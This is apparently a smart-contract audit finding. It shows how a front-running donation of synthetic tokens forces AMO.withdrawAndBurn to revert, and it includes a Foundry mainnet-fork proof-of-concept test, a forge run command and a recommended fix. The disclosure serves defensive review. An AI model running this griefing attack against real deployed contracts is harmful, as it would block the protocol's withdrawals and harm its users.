### Title
Attacker can front-run `AMO.withdrawAndBurn` with a synthetic-token donation and force reverts - ([File: contracts/AMO.sol](contracts/AMO.sol))

### Summary
`AMO.withdrawAndBurn` measures the Vesper withdrawal result using the change in the AMO contract’s synthetic-token balance, then reverts if that measured amount exceeds `syntheticToken.amoSupply`. Because ordinary users can freely transfer synthetic tokens directly to the AMO contract, an attacker can front-run a keeper transaction with a donation large enough that `withdrawnAmount + donation > amoSupply`, causing the keeper transaction to revert. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
`withdrawAndBurn` first converts the requested synthetic-token amount into Vesper shares, calls `_withdrawFromVesper`, and rejects the result when it exceeds `amoSupply`. `_withdrawFromVesper` snapshots `syntheticToken_.balanceOf(address(this))`, calls `vPool_.withdraw(shares_)`, and returns `balanceAfter - balanceBefore`. [4](#0-3) [2](#0-1) 

That balance delta is not restricted to tokens produced by `vPool_.withdraw`. Any synthetic tokens transferred to the AMO contract between the balance snapshot and the final balance read are counted as withdrawn tokens. `SyntheticToken.transfer` is a public ERC-20 entry point and does not prohibit transfers to the AMO address. [3](#0-2) 

An attacker can therefore monitor a keeper’s `withdrawAndBurn` transaction and front-run it with:

```solidity
syntheticToken.transfer(address(amo), donation);
```

If the Vesper withdrawal returns `withdrawn`, the AMO computes `amountToBurn = withdrawn + donation`. The keeper call reverts with `AmountToBurnGreaterThanAmoSupply` whenever `donation > amoSupply - withdrawn`. If the attacker donates at least `amoSupply`, every withdrawal amount fails this check because `amountToBurn >= amoSupply` even before any meaningful withdrawal proceeds are added. [5](#0-4) 

### Impact Explanation
This temporarily freezes the AMO’s authorized deleveraging path. `withdrawAndBurn` is the function used to withdraw AMO liquidity from the configured Vesper pool and burn the returned synthetic supply; repeatedly forcing it to revert prevents that operation from completing while the donation remains counted in the AMO balance. [6](#0-5) 

The impact is temporary rather than permanent because governance can eventually recover donated tokens through `sweep`, or increase `amoSupply` through additional AMO minting. Nevertheless, an unprivileged attacker can force keeper transactions to revert and delay AMO withdrawals without needing any privileged role. [7](#0-6) 

### Likelihood Explanation
The attack requires the attacker to hold or acquire synthetic tokens and to front-run an authorized `withdrawAndBurn` call. Synthetic tokens are transferable by ordinary users, and the AMO contract does not distinguish donated tokens from withdrawal proceeds. The attacker must donate enough to make the measured delta exceed `amoSupply`; donating at least `amoSupply` guarantees the check fails for every subsequent withdrawal while the donated balance remains in the contract. [3](#0-2) [5](#0-4) 

The authorization checks do not mitigate the issue: the keeper remains the caller, while the unprivileged attacker only makes a normal ERC-20 transfer. Likewise, the configured-pool check only validates `vPool_`; it does not validate the source of the synthetic-token balance delta. [8](#0-7) [9](#0-8) 

### Recommendation
Do not use the AMO contract’s raw synthetic-token balance delta as the amount withdrawn when unsolicited synthetic-token donations are possible. Prefer one of the following:

- Make Vesper return or expose the withdrawn underlying amount and use that value directly.
- Keep accounting of the AMO’s expected synthetic balance and calculate only the increase attributable to `vPool_.withdraw`.
- Cap the amount burned to `syntheticToken_.amoSupply()` instead of reverting:

```solidity
uint256 amountToBurn = Math.min(
    syntheticToken_.balanceOf(address(this)),
    syntheticToken_.amoSupply()
);
syntheticToken_.burn(address(this), amountToBurn);
```

- Alternatively, leave the excess tokens in the AMO contract for governor `sweep` rather than treating them as burnable AMO supply.

The fix should preserve the invariant that at most `amoSupply` is burned, while preventing unrelated donations from changing the success or failure of `withdrawAndBurn`. [10](#0-9) [7](#0-6) 

### Proof of Concept
The following Foundry mainnet-fork test demonstrates the revert. Replace the constants with the deployed AMO, synthetic token, configured Vesper pool, an authorized keeper, and a synthetic-token holder for the target deployment.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

interface IERC20Like {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface ISyntheticTokenLike is IERC20Like {
    function amoSupply() external view returns (uint256);
}

interface IAMO {
    function withdrawAndBurn(
        address syntheticToken,
        address vPool,
        uint256 amount
    ) external;
}

contract AmoDonationRevertTest is Test {
    address constant AMO = address(0);          // deployed AMO
    address constant MS_TOKEN = address(0);     // configured synthetic token
    address constant VPOOL = address(0);        // amo.vPools(MS_TOKEN)
    address constant KEEPER = address(0);       // amo.isKeeper(KEEPER) == true
    address constant HOLDER = address(0);       // ordinary holder of MS_TOKEN

    function test_donationForcesWithdrawAndBurnRevert() external {
        IAMO amo = IAMO(AMO);
        ISyntheticTokenLike msToken = ISyntheticTokenLike(MS_TOKEN);

        uint256 amoSupply = msToken.amoSupply();
        assertGt(amoSupply, 0);

        // Give the unprivileged attacker real synthetic tokens from an
        // existing holder. On a fork this represents tokens obtained through
        // minting, repayment flows, or the open market.
        address attacker = makeAddr("attacker");
        vm.prank(HOLDER);
        msToken.transfer(attacker, amoSupply);

        // Front-run the keeper's withdrawal. This is a normal ERC-20 transfer
        // and requires no role or approval from AMO.
        vm.prank(attacker);
        msToken.transfer(AMO, amoSupply);

        // The measured balance delta now includes the donation as well as
        // tokens returned by the Vesper withdrawal. The check against
        // amoSupply therefore reverts.
        vm.prank(KEEPER);
        vm.expectRevert(); // AmountToBurnGreaterThanAmoSupply
        amo.withdrawAndBurn(MS_TOKEN, VPOOL, amoSupply);
    }
}
```

Run it with:

```bash
forge test --match-test test_donationForcesWithdrawAndBurnRevert \
  --fork-url "$MAINNET_RPC_URL"
```

The critical state transition is:

```text
before          = balanceOf(AMO)
attacker        transfers `amoSupply` to AMO
withdrawal      returns W synthetic tokens
amountToBurn    = balanceOf(AMO) + W - before
                = amoSupply + W
check           = amountToBurn > amoSupply
result          = revert
```

This is a concrete, unprivileged front-running path: the attacker only calls `SyntheticToken.transfer`, while the authorized keeper triggers the vulnerable balance-delta accounting in `AMO.withdrawAndBurn`. [3](#0-2) [1](#0-0)

### Citations

**File:** contracts/AMO.sol (L42-46)
```text
    modifier onlyAuthorized() {
        address _msgSender = _msgSender();
        if (!isKeeper(_msgSender) && _msgSender != governor()) revert CallerIsNotAuthorized();
        _;
    }
```

**File:** contracts/AMO.sol (L85-105)
```text
    /**
     * @notice Only 'authorized' role can call this function.
     * It will calculate `_shares` from `amount_` and withdraw `_shares` from `vPool_` and
     * burn amount of Synthetic token withdrawn from Vesper.
     * @param syntheticToken_ Synthetic Token Address
     * @param vPool_ Vesper pool address where Synthetic token is defined as collateral.
     * @param amount_ Amount in Synthetic token
     */
    function withdrawAndBurn(ISyntheticToken syntheticToken_, IVPool vPool_, uint256 amount_) external onlyAuthorized {
        if (amount_ == 0) revert AmountIsZero();
        if (vPools[address(syntheticToken_)] != address(vPool_)) revert VesperPoolIsNotAllowed();

        // 1. Calculate shares to withdraw
        uint256 _shares = Math.min((amount_ * 1e18) / vPool_.pricePerShare(), vPool_.balanceOf(address(this)));

        // 2. Withdraw synth from Vesper pool
        uint256 _amountToBurn = _withdrawFromVesper(syntheticToken_, vPool_, _shares);
        if (_amountToBurn > syntheticToken_.amoSupply()) revert AmountToBurnGreaterThanAmoSupply();

        // 3. Burn synth withdrawn from Vesper pool
        syntheticToken_.burn(address(this), _amountToBurn);
```

**File:** contracts/AMO.sol (L137-146)
```text
    function _withdrawFromVesper(
        ISyntheticToken syntheticToken_,
        IVPool vPool_,
        uint256 shares_
    ) private returns (uint256) {
        // Vesper pool may withdraw less, of course burn less shares too, than requested.
        // Hence the difference of Synth balance after withdraw and before withdraw is actual Synth withdrawn.
        uint256 _before = syntheticToken_.balanceOf(address(this));
        vPool_.withdraw(shares_);
        return syntheticToken_.balanceOf(address(this)) - _before;
```

**File:** contracts/AMO.sol (L177-189)
```text
    /**
     * @notice ERC20 recovery in case of stuck tokens due direct transfers to the contract address.
     * @param token_ The token to transfer
     * @param amount_ The amount to send
     */
    function sweep(IERC20 token_, uint256 amount_) external onlyGovernor {
        if (amount_ == 0) revert AmountIsZero();

        if (address(token_) == address(0)) {
            Address.sendValue(payable(governor()), amount_);
        } else {
            token_.safeTransfer(governor(), amount_);
        }
```

**File:** contracts/SyntheticToken.sol (L233-251)
```text
    /// @inheritdoc IERC20
    function transfer(address to_, uint256 amount_) external override returns (bool) {
        _transfer(_msgSender(), to_, amount_);
        return true;
    }

    /// @inheritdoc IERC20
    function transferFrom(address from_, address to_, uint256 amount_) external override returns (bool) {
        address _msgSender = _msgSender();
        uint256 _currentAllowance = allowance[from_][_msgSender];
        if (_currentAllowance != type(uint256).max) {
            if (_currentAllowance < amount_) revert AmountExceedsAllowance();
            unchecked {
                _approve(from_, _msgSender, _currentAllowance - amount_);
            }
        }

        _transfer(from_, to_, amount_);

```
